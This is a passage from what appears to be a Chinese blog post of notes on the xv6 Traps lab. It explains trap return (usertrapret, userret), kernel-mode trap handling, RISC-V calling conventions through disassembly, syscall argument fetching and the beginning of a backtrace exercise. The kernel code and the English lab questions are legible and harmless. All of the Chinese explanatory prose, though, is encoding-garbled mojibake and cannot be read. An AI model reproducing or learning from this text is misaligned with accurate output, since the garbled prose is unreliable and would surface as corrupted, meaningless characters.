åˆ°å›åˆ°ç”¨æˆ·æ€çš„æ‰§è¡Œè¿‡ç¨‹è¢«ä¸­æ–­ï¼Œè¿™æ—¶ CPU å°±ä¼šé”™è¯¯åœ°è·³è½¬åˆ°ä¸ºç”¨æˆ·æ€å‡†å¤‡çš„ Â <code>uservec</code>ï¼Œè€Œ<strong>æ­¤æ—¶æˆ‘ä»¬è¿˜å¤„äºå†…æ ¸æ€</strong>ï¼å› æ­¤æˆ‘ä»¬éœ€è¦å…³é—­ä¸­æ–­ï¼Œä»¥ç¡®ä¿åˆ°è¿”å›ç”¨æˆ·æ€çš„è¿‡ç¨‹ä¸­çš„æ“ä½œéƒ½æ˜¯åŸå­çš„ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬çœ‹çœ‹ <code>stvec</code> çš„åˆ‡æ¢ï¼š<code>trampoline_uservec = TRAMPOLINE + (uservec - trampoline)</code> å®ƒå°†åœ¨<strong>å†…æ ¸åœ°å€ç©ºé—´</strong>ä¸­å·²çŸ¥çš„ç¬¦å·åœ°å€ <code>uservec</code> ä¸ <code>trampoline</code>ï¼Œå®‰å…¨åœ°è½¬æ¢ä¸ºäº†åœ¨<strong>ç”¨æˆ·åœ°å€ç©ºé—´</strong>ä¸­å¯¹åº”çš„æ­£ç¡®çš„ <code>uservec</code> å‡½æ•°è™šæ‹Ÿåœ°å€ã€‚</p><p>ç„¶åæ›´æ–° Â <code>p-&gt;trapframe-&gt;kernel_*</code>Â  å­—æ®µï¼Œä¸º<strong>ä¸‹ä¸€æ¬¡</strong>ä»ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„ trap åšå‡†å¤‡ã€‚æ¥ä¸‹æ¥å‡†å¤‡ Â <code>sret</code>Â  æŒ‡ä»¤æ‰€éœ€çš„å¯„å­˜å™¨ <code>sstatus</code> ä¸ <code>sepc</code> ï¼Œè®¾ç½®è¿”å›ç‰¹æƒçº§ä¸º User-mode å¹¶è®¾ç½® SPIE åœ¨è¿”å›åå¼€å¯ä¸­æ–­ã€‚</p><p>æœ€åæŠŠç”¨æˆ·è¿›ç¨‹çš„é¡µè¡¨ç‰©ç†åœ°å€ <code>p-&gt;pagetable</code> ä½œä¸ºå‚æ•°è°ƒç”¨ <code>userret</code>ã€‚</p><h3 id="5-userret-æ¢å¤ç¡¬ä»¶ä¸Šä¸‹æ–‡"><a class="markdownIt-Anchor" href="#5-userret-æ¢å¤ç¡¬ä»¶ä¸Šä¸‹æ–‡"></a> 5. userret æ¢å¤ç¡¬ä»¶ä¸Šä¸‹æ–‡</h3><p><code>userret</code> çš„é€»è¾‘å¾ˆç®€å•äº†ï¼Œæ‹¿åˆ° <code>a0</code> ä»£è¡¨çš„é¡µè¡¨åœ°å€ï¼Œå®‰åˆ° <code>satp</code> ä¸­å®ç°å†…å­˜è§†å›¾çš„åˆ‡æ¢ï¼Œç„¶åä¸€ä¸€æ¢å¤åœ¨ trapframe ä¸­ä¿å­˜çš„å¯„å­˜å™¨å€¼ï¼Œæœ€å <code>sret</code> è¿”å›ä¼šä½¿ç”¨åˆ°åœ¨ <code>usertrapret</code> ä¸­è®¾ç½®å¥½çš„ <code>sstatus</code> ä¸ <code>sepc</code> â€”â€” å°†ç¨‹åºè®¡æ•°å™¨ Â pcÂ  çš„å€¼è®¾ç½®ä¸º Â <code>sepc</code>Â  å¯„å­˜å™¨çš„å€¼ï¼Œè¯»å– Â <code>sstatus</code>Â  ä¸­çš„ Â SPPÂ  ä½ï¼ˆä¹‹å‰è®¾ä¸ºç”¨æˆ·æ€ï¼‰ï¼Œå°† CPU çš„ç‰¹æƒçº§é™ä¸ºç”¨æˆ·æ€ï¼Œè¯»å– Â <code>sstatus</code>Â  ä¸­çš„ Â SPIEÂ  ä½æ¢å¤ä¸­æ–­çŠ¶æ€ã€‚</p><blockquote><p><code>userret</code>Â (åœ¨æ±‡ç¼–å’Œç”¨æˆ·é¡µè¡¨ä¸‹) åˆ™åƒä¸€ä¸ªé«˜æ•ˆçš„æœºæ¢°è‡‚ï¼Œå®ƒåšçš„éƒ½æ˜¯çº¯ç²¹çš„ç¡¬ä»¶æ“ä½œï¼šåˆ‡æ¢é¡µè¡¨ã€ä»å†…å­˜ä¸­åŠ è½½æ•°æ®åˆ°å¯„å­˜å™¨ï¼Œæœ€åè§¦å‘ Â sretÂ  æŒ‡ä»¤ï¼Œå®Œæˆæ—¶ç©ºç©¿æ¢­ï¼Œè®© CPU å®Œç¾åœ°å›åˆ°ç”¨æˆ·ç¨‹åºè¢«æ‰“æ–­çš„é‚£ä¸ªç¬é—´ï¼Œä»¿ä½›ä»€ä¹ˆéƒ½æ²¡å‘ç”Ÿè¿‡ä¸€æ ·ã€‚ â€”â€”æ¥è‡ªä¸­äºŒ Gemini 2.5 pro</p></blockquote><h2 id="æ¥è‡ªå†…æ ¸æ€çš„-trap"><a class="markdownIt-Anchor" href="#æ¥è‡ªå†…æ ¸æ€çš„-trap"></a> æ¥è‡ªå†…æ ¸æ€çš„ Trap</h2><p>åœ¨å†…æ ¸æ€ä¸‹å¯èƒ½å‘ç”Ÿçš„ trap ä¸»è¦åˆ†ä¸ºä¸¤å¤§ç±»ï¼š</p><ul><li><strong>ä¸­æ–­ï¼ˆInterruptï¼‰</strong>â€”â€” æ¥è‡ªå¤–éƒ¨çš„ã€å¼‚æ­¥çš„äº‹ä»¶ï¼ˆå¦‚é¢‘ç¹çš„å®šæ—¶å™¨ä¸­æ–­ï¼Œå¤–éƒ¨è®¾å¤‡ä¸­æ–­ï¼‰</li><li><strong>å¼‚å¸¸ï¼ˆExceptionï¼‰</strong>â€”â€” æ¥è‡ª CPU å†…éƒ¨çš„ã€åŒæ­¥çš„é”™è¯¯ï¼ˆå¦‚ page faultï¼Œæ‰§è¡Œéæ³•æŒ‡ä»¤ç­‰ï¼‰</li></ul><p>ä¸ç”¨æˆ·æ€ç›¸ä¼¼ï¼Œåœ¨å†…æ ¸æ€ä¸‹å‘ç”Ÿ trap é¦–å…ˆç¡¬ä»¶ä¼šç¦ç”¨ä¸­æ–­ï¼Œä¿å­˜ <code>sepc</code> ï¼Œè®¾ç½® <code>scause</code> ï¼Œç„¶åè·³è½¬åˆ° <code>stvec</code> ä¸­çš„å†…æ ¸é™·é˜±å¤„ç†å‘é‡ <code>kernelvec</code> ã€‚ä½äºå†…æ ¸æ€ä¸‹ï¼Œå½“å‰çš„ <code>satp</code> ä¿å­˜çš„æ˜¯å†…æ ¸é¡µè¡¨ï¼Œæ ˆæŒ‡é’ˆ <code>sp</code> æŒ‡å‘çš„æ˜¯å†…æ ¸æ ˆï¼Œé€šè¿‡å°†å¯„å­˜å™¨å€¼æ¨å…¥å†…æ ¸æ ˆä¿å­˜äº†å½“å‰æ‰§è¡Œæµï¼ˆxv6 book ä¸­æ‰€è°“çš„â€kernel threadâ€œï¼‰çš„ä¸Šä¸‹æ–‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// kernel/kernelvec.S</span><br><span class="line">kernelvec:</span><br><span class="line">        addi sp, sp, -256</span><br><span class="line"></span><br><span class="line">        # save the 32 registers</span><br><span class="line">        sd ra, 0(sp)</span><br><span class="line"># ...</span><br><span class="line">        sd t6, 240(sp)</span><br><span class="line"></span><br><span class="line">        # call the C trap handler in trap.c</span><br><span class="line">        call kerneltrap</span><br><span class="line"></span><br><span class="line">        # restore registers</span><br><span class="line">        ld ra, 0(sp)</span><br><span class="line">        ld sp, 8(sp)</span><br><span class="line">        # not tp (contains hartid), in case we moved CPUs</span><br><span class="line">        # -- è¿™ä¸ªé—®é¢˜ç•™åˆ°è¿›ç¨‹è°ƒåº¦çš„å®éªŒæ¥åˆ†æ --</span><br><span class="line">        ld t0, 32(sp)</span><br><span class="line"># ...</span><br><span class="line">ld t6, 240(sp)</span><br><span class="line"></span><br><span class="line">        addi sp, sp, 256</span><br><span class="line"></span><br><span class="line">        sret</span><br></pre></td></tr></table></figure><p>ä¿å­˜å®Œå¯„å­˜å™¨åè·³è½¬åˆ° <code>kerneltrap()</code> æ‰§è¡Œå…·ä½“çš„åˆ†å‘é€»è¾‘ï¼Œç„¶åè¿”å›åˆ° <code>kernelvec</code> å¼¹å‡ºå†…æ ¸æ ˆä¸Šçš„å¯„å­˜å™¨å€¼ï¼Œ<code>sret</code> è·³è½¬å›å‘ç”Ÿ trap å‰çš„æŒ‡ä»¤ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/trap.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">kerneltrap</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line">  uint64 sepc = r_sepc();</span><br><span class="line">  uint64 sstatus = r_sstatus();</span><br><span class="line">  uint64 scause = r_scause();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((sstatus &amp; SSTATUS_SPP) == <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap: not from supervisor mode&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(intr_get() != <span class="number">0</span>)</span><br><span class="line">    <span class="comment">// è§¦å‘trapç¡¬ä»¶ä¼šå…³é—­ä¸­æ–­ï¼Œé¿å… nested trap</span></span><br><span class="line">    panic(<span class="string">&quot;kerneltrap: interrupts enabled&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((which_dev = devintr()) == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">// å¼‚å¸¸æŠ¥å‘Šï¼Œç›´æ¥panic</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;scause %p\n&quot;</span>, scause);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ—¶é’Ÿä¸­æ–­æ”¾å¼ƒCPU</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span> &amp;&amp; myproc() != <span class="number">0</span> &amp;&amp; myproc()-&gt;state == RUNNING)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// yield() å¯èƒ½ä¼šè§¦å‘trapè¦†ç›–sepc,Â sstatus,Â scauseÂ ç­‰</span></span><br><span class="line">  <span class="comment">// å°†sepcå’ŒsstatusÂ å¯„å­˜å™¨æ¢å¤åˆ°æœ¬æ¬¡é™·é˜±å‘ç”Ÿæ—¶çš„åˆå§‹çŠ¶æ€</span></span><br><span class="line">  w_sepc(sepc);</span><br><span class="line">  w_sstatus(sstatus);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="risc-v-assembly"><a class="markdownIt-Anchor" href="#risc-v-assembly"></a> RISC-V assembly</h1><p>é€šè¿‡è¿™ä¸ªä»»åŠ¡æˆ‘ä»¬äº†è§£ä¸€ä¸‹ RISC-V çš„æ±‡ç¼–ä»£ç ã€‚<br><img src="/2025/07/08/Lab-Traps/calling_convention.png" alt="calling_convention.png"><br>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ RISC-V è°ƒç”¨è§„åˆ™ï¼ˆCalling Conventionï¼‰ä¸­å¸¸è§çš„å‡ ä¸ªå¯„å­˜å™¨çš„ä½¿ç”¨è§„èŒƒï¼š</p><ul><li><code>a0</code>-<code>a7</code> ä¸€èˆ¬ç”¨æ¥ä¼ é€’å‡½æ•°å‚æ•°ï¼Œå…¶ä¸­ <code>a0</code> å’Œ <code>a1</code> å¯ä»¥æ”¾å‡½æ•°è¿”å›å€¼ï¼Œå®ƒä»¬éƒ½æ˜¯ Caller-saved çš„</li><li><code>ra</code> æ”¾ç½®è¿”å›åœ°å€ï¼Œè¿™ä¸ªä¹Ÿæ˜¯ Caller-saved</li><li><code>s0</code> å¸§æŒ‡é’ˆï¼Œå³ x86 ä¸­çš„ <code>rbp</code></li><li><code>sp</code> æ ˆæŒ‡é’ˆï¼Œå³ x86 ä¸­çš„ <code>rsp</code></li></ul><p>è¿™å‡ ä¸ªå¯„å­˜å™¨çš„ä½¿ç”¨å®ä¾‹æˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹ <code>call.c</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// user/call.asm</span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;g&gt;:</span><br><span class="line">int g(int x) &#123;</span><br><span class="line">   0:1141                addisp,sp,-16</span><br><span class="line">   2:e422                sds0,8(sp)</span><br><span class="line">   4:0800                addis0,sp,16</span><br><span class="line">  return x+3;</span><br><span class="line">&#125;</span><br><span class="line">   6:250d                addiwa0,a0,3</span><br><span class="line">   8:6422                lds0,8(sp)</span><br><span class="line">   a:0141                addisp,sp,16</span><br><span class="line">   c:8082                ret</span><br><span class="line"></span><br><span class="line">000000000000000e &lt;f&gt;:</span><br><span class="line">int f(int x) &#123;</span><br><span class="line">   e:1141                addisp,sp,-16</span><br><span class="line">  10:e422                sds0,8(sp)</span><br><span class="line">  12:0800                addis0,sp,16</span><br><span class="line">  return g(x);</span><br><span class="line">&#125;</span><br><span class="line">  14:250d                addiwa0,a0,3  // ç¼–è¯‘å™¨æŠŠgä¼˜åŒ–ä¸ºx+3äº†</span><br><span class="line">  16:6422                lds0,8(sp)</span><br><span class="line">  18:0141                addisp,sp,16</span><br><span class="line">  1a:8082                ret</span><br><span class="line"></span><br><span class="line">000000000000001c &lt;main&gt;:</span><br><span class="line"></span><br><span class="line">void main(void) &#123;</span><br><span class="line">  1c:1141                addisp,sp,-16 // æ„å»º16å­—èŠ‚çš„æ ˆç©ºé—´</span><br><span class="line">  1e:e406                sdra,8(sp)   // è¿”å›åœ°å€raå…¥æ ˆ</span><br><span class="line">  20:e022                sds0,0(sp)   // æ—§å¸§æŒ‡é’ˆs0å…¥æ ˆ</span><br><span class="line">  22:0800                addis0,sp,16 // æ›´æ–°å¸§æŒ‡é’ˆ</span><br><span class="line">  printf(&quot;%d %d\n&quot;, f(8)+1, 13);</span><br><span class="line">  24:4635                lia2,13</span><br><span class="line">  26:45b1                lia1,12      // ç¼–è¯‘å™¨ä¹Ÿæ˜¯ç›´æ¥ä¼˜åŒ–äº†è¿™ä¸ªfè°ƒç”¨</span><br><span class="line">  28:00001517          auipca0,0x1</span><br><span class="line">  2c:82850513          addia0,a0,-2008 # 850 &lt;malloc+0xec&gt;</span><br><span class="line">  30:680000ef          jalra,6b0 &lt;printf&gt;</span><br><span class="line">  exit(0);</span><br><span class="line">  34:4501                lia0,0</span><br><span class="line">  36:26e000ef          jalra,2a4 &lt;exit&gt;</span><br></pre></td></tr></table></figure><blockquote><p>Which registers contain arguments to functions? For example, which register holds 13 in mainâ€™s call toÂ <code>printf</code>?</p><p>Where is the call to functionÂ <code>f</code>Â in the assembly code for main? Where is the call toÂ <code>g</code>? (Hint: the compiler may inline functions.)</p></blockquote><p>å¯ä»¥çœ‹åˆ° <code>a0</code> ï¼Œ<code>a1</code>å’Œ<code>a2</code> åˆ†åˆ«å­˜æ”¾äº† <code>printf()</code> çš„ä¸‰ä¸ªå‚æ•°ï¼Œå…¶ä¸­ <code>a0</code> æ”¾çš„æ˜¯ <code>&quot;%d %d\n&quot;</code> å­—ç¬¦ä¸²å­—é¢é‡ï¼Œè¿™ä¸ªä¸åœ¨ .text ä»£ç æ®µè€Œåœ¨ .rodata å·²åˆå§‹åŒ–æ•°æ®æ®µä¸­ï¼Œ<code>a1</code> åº”è¯¥æ”¾çš„æ˜¯ f çš„è¿”å›å€¼ï¼Œè¿™é‡Œç¼–è¯‘å™¨åšäº†ä¼˜åŒ–ï¼Œæ‰€ä»¥æ”¾çš„æ˜¯ 12ã€‚</p><blockquote><p>At what address is the functionÂ <code>printf</code>Â located?</p><p>What value is in the registerÂ <code>ra</code>Â just after theÂ <code>jalr</code>Â toÂ <code>printf</code>Â inÂ <code>main</code>?</p></blockquote><p>xv6 æ²¡æœ‰ä½¿ç”¨ <code>plt</code>/<code>got</code>ï¼Œé™æ€é“¾æ¥äº† <code>printf</code> å‡½æ•°ï¼Œæ‰€ä»¥å®ƒçš„åœ°å€å°±åœ¨ <code>0x6b0</code> å¤„ï¼ŒåŒæ—¶æŠŠè¿”å›åœ°å€ä¿å­˜åœ¨ <code>ra</code> ä¸­ã€‚</p><hr><p>ä¸‹é¢æˆ‘ä»¬å»¶ç”³ä¸€ä¸‹è¿™ä¸ªä»»åŠ¡ï¼ŒRTFSC å…·ä½“åˆ†æ xv6 çš„å‚æ•°ä¼ é€’ï¼ˆç”¨æˆ·æ€å†…æ ¸æ€é—´ä¼ é€’ï¼‰ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œsyscall å‚æ•°çš„ä¼ é€’æ˜¯é€šè¿‡å¯„å­˜å™¨ <code>a0</code>- <code>a7</code> å®ç°çš„ï¼Œè¿™äº›å¯„å­˜å™¨å€¼ä¼šè¢« trap å¤„ç†å‘é‡ï¼ˆ<code>uservec</code>ï¼Œ<code>kernelvec</code>ï¼‰ä¿å­˜åˆ°è¿›ç¨‹çš„ trapframe ä¸­ã€‚ç„¶å kernel code é€šè¿‡ <code>argint()</code> , <code>argaddr()</code>, <code>argfd()</code> ç­‰æŠŠç¬¬ <code>n</code> ä¸ªå‚æ•°è§£é‡Šä¸ºå¯¹åº”ç±»å‹ï¼Œå®ƒä»¬éƒ½æ˜¯å¯¹ <code>argraw()</code> çš„å°è£…ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/syscall.c</span></span><br><span class="line"><span class="type">static</span> uint64 <span class="title function_">argraw</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="keyword">switch</span> (n) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> p-&gt;trapframe-&gt;a0;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">return</span> p-&gt;trapframe-&gt;a1;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">return</span> p-&gt;trapframe-&gt;a2;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">return</span> p-&gt;trapframe-&gt;a3;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    <span class="keyword">return</span> p-&gt;trapframe-&gt;a4;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">    <span class="keyword">return</span> p-&gt;trapframe-&gt;a5;</span><br><span class="line">  &#125;</span><br><span class="line">  panic(<span class="string">&quot;argraw&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">argint</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> *ip)</span>&#123;</span><br><span class="line">  *ip = argraw(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">argaddr</span><span class="params">(<span class="type">int</span> n, uint64 *ip)</span>&#123;</span><br><span class="line">  *ip = argraw(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºä¼ é€’çš„åœ°å€å‚æ•°ï¼Œsyscall å¯èƒ½ä¼šå¯¹è¿™ä¸ªåœ°å€è¿›è¡Œè¯»å†™ï¼Œä½†<strong>è¿™ä¸ªåœ°å€æ˜¯ç”¨æˆ·ç©ºé—´çš„è™šæ‹Ÿåœ°å€ï¼Œæ­¤æ—¶ <code>satp</code> å·²ç»åˆ‡æ¢ä¸ºäº†å†…æ ¸é¡µè¡¨</strong>ï¼Œæ‰€ä»¥å†…æ ¸æ— æ³•ç›´æ¥å¯¹è¿™ä¸ªè™šæ‹Ÿåœ°å€è¿›è¡Œè¯»å†™ã€‚</p><p>ä¸¾ä¸€ä¸ªç‰¹æ®Šä¾‹å­ <code>exec()</code> ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œå®é™…ä¸Šä¼ é€’çš„æ˜¯ .rodata æ®µä¸Šå­—ç¬¦ä¸²å¯¹åº”çš„ç”¨æˆ·ç©ºé—´è™šæ‹Ÿåœ°å€ã€‚é¦–å…ˆé€šè¿‡ <code>argaddr()</code> å¾—åˆ°è¿™ä¸ªè™šæ‹Ÿåœ°å€ <code>addr</code> ï¼Œç„¶åæˆ‘ä»¬ä½¿ç”¨ <code>fetchstr()</code> å®‰å…¨åœ°ä»ç”¨æˆ·ç©ºé—´è¯»å–å­—ç¬¦ä¸²åˆ°å†…æ ¸ç©ºé—´ä¸­ã€‚<code>fetchstr()</code> æ˜¯å¯¹ <code>copyinstr()</code> çš„å°è£…ï¼Œåè€…å…·ä½“å®ç°å¤åˆ¶æ“ä½œã€‚ä¸ºäº†èƒ½å¤Ÿè¯»å–ç”¨æˆ·è™šæ‹Ÿåœ°å€çš„å€¼ï¼Œéœ€è¦ä¼ é€’ç”¨æˆ·é¡µè¡¨ <code>p-&gt;pagetable</code> ï¼Œç„¶å <code>walkaddr()</code> æ‰¾åˆ° <code>addr</code> å¯¹åº”çš„ç‰©ç†åœ°å€ï¼ŒåŸºäºå†…æ ¸åœ°å€ç©ºé—´ä¸ç‰©ç†å†…å­˜åœ°å€ä¸€ä¸€æ˜ å°„å®ç°è¯»å†™ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/syscall.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">argstr</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> *buf, <span class="type">int</span> max)</span>&#123;</span><br><span class="line">  uint64 addr;</span><br><span class="line">  argaddr(n, &amp;addr);</span><br><span class="line">  <span class="keyword">return</span> fetchstr(addr, buf, max);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fetchstr</span><span class="params">(uint64 addr, <span class="type">char</span> *buf, <span class="type">int</span> max)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="keyword">if</span>(copyinstr(p-&gt;pagetable, buf, addr, max) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">copyinstr</span><span class="params">(<span class="type">pagetable_t</span> pagetable, <span class="type">char</span> *dst, uint64 srcva, uint64 max)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">while</span>(got_null == <span class="number">0</span> &amp;&amp; max &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(srcva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="backtrace"><a class="markdownIt-Anchor" href="#backtrace"></a> Backtrace</h1><blockquote><p>Implement aÂ <code>backtrace()</code> function inÂ <code>kernel/printf.c</code>. Insert a call to this function inÂ <code>sys_sleep</code>, and then runÂ bttest, which callsÂ <code>sys_sleep</code>. Your output should be a list of return addresses.</p></blockquote><p>æˆ‘ä»¬éœ€è¦å®ç°å’Œ GDB ä¸­ <code>backtrace</code> æŒ‡ä»¤ä¸€æ ·çš„çš„åŠŸèƒ½ï¼Œæ‰“å°å½“å‰è¿›ç¨‹çš„å‡½æ•°è°ƒç”¨æ ˆã€‚</p><p>æ³¨æ„ RISC-V æŒ‡ä»¤é›†ä¸‹ç¨‹åºæ ˆå’Œ x86 æœ‰æ‰€ä¸åŒï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ ˆç”±ä¸Šå¾€ä¸‹åœ°å€å‡å°</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+  â† <span class="selector-tag">s0</span></span><br><span class="line">|      <span class="selector-tag">return</span> <span class="selector-tag">address</span>        |</span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">| Â  Â  Â  <span class="selector-tag">old</span> <span class="selector-tag">s0</span> <span class="selector-tag">value</span> Â  Â  Â  Â  |</span><br><span class="line">+<span class="selector-tag">----------------------------</span>+   <span class="selector-tag">---</span>&gt; <span class="selector-tag">stack</span> <span class="selector-tag">frame</span></span><br><span class="line">|        ...........         |</span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">| Â   Â  <span class="selector-tag">local</span> <span class="selector-tag">variables</span>Â   Â  Â  |</span><br><span class="line">+<span class="selector-tag">----------------------------</span>+  â† <span class="selector-tag">sp</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç”±å½“å‰å¸§æŒ‡é’ˆ <code>s0</code> è¯»å–ä¸Šå±‚å‡½æ•°è°ƒç”¨çš„æ ˆå¸§ <code>old_s0 = s0 -16</code>ï¼Œä»¥æ­¤è¿­ä»£å¯ä»¥<strong>å‘ä¸Š</strong>è¯»å–è°ƒç”¨æ ˆä¸Šæ‰€æœ‰çš„è¿”å›åœ°å€ <code>ra = s0 - 